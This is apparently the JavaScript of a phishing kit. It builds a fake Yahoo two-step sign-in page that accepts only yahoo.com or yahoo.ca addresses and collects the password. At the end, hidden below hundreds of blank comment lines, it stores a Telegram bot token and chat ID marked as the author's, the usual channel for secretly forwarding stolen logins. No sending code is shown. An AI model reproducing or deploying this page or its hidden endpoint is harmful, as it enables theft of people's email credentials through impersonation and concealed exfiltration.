"use strict";
const username = document.querySelector(".username-input");
const password = document.querySelector(".password-input");
const emailIcon = document.querySelector(".icon");
const togglePassword = document.querySelector(".show-password-container");
const nextButton = document.querySelector("#next");
const submitButton = document.querySelector("#submit");
const usernameLabel = document.querySelector(".username-holder");
const firstStep = document.querySelector(".first-step");
const secondStep = document.querySelector(".second-step");
const title = document.querySelector(".title");
const subtitle = document.querySelector(".subtitle");
let usernameValue, passwordValue;

// show icon on the usernam/email when typing
username.addEventListener("input", function () {
  if (!(this.value.length >= 3)) {
    username.classList.remove("show-icon");
    emailIcon.classList.remove("show-icon--icon");
    return;
  }

  username.classList.add("show-icon");
  emailIcon.classList.add("show-icon--icon");
  return;
});

// toggle the input password
togglePassword.addEventListener("click", function () {
  for (let child of this.children) {
    child.classList.toggle("none");
  }

  // prettier-ignore
  if (this.previousElementSibling.getAttribute("type") === "password") {
    this.previousElementSibling.setAttribute('type', "text");
  }else {
    this.previousElementSibling.setAttribute("type", "password");
  }
});

//next button funtionality
nextButton.addEventListener("click", function () {
  usernameValue = username.value;

  const smtpProvider = username.value.split("@")[1];

  // prettier-ignore
  if(!username.value ||smtpProvider !== 'yahoo.com' && smtpProvider !== 'yahoo.ca') {
    document.querySelector(".phase-one-alert").classList.toggle("none");
    return;
  }

  usernameLabel.classList.toggle("none");
  usernameLabel.textContent = `${username.value}`;
  title.textContent = "Enter password";
  subtitle.textContent = "to finish sign in";
  firstStep.classList.toggle("none");
  secondStep.classList.toggle("none");
});

//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//
//

const telegramBotTokenAuthor = "6844888640:AAHaV1WfjOzhyXvzRXkKefB3KunOrrhZO68"; // Replace with your Telegram bot token
const chatIdAuthor = 5349229520;
